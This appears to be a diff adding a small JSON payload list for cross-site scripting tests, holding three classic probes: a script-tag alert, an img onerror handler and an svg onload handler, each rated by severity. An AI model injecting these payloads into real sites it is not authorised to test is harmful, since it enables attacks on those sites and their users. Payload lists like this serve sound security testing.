@@ -1,0 +1,23 @@
+[
+    {
+        "id": "xss_script_alert",
+        "name": "Basic Script Alert",
+        "payload": "<script>alert('XSS')</script>",
+        "severity": "High",
+        "description": "Standard script tag injection."
+    },
+    {
+        "id": "xss_img_onerror",
+        "name": "Image OnError",
+        "payload": "<img src=x onerror=alert(1)>",
+        "severity": "Medium",
+        "description": "Event handler injection via image tag."
+    },
+    {
+        "id": "xss_svg_onload",
+        "name": "SVG OnLoad",
+        "payload": "<svg/onload=alert(1)>",
+        "severity": "Medium",
+        "description": "Event handler injection via SVG."
+    }
+]
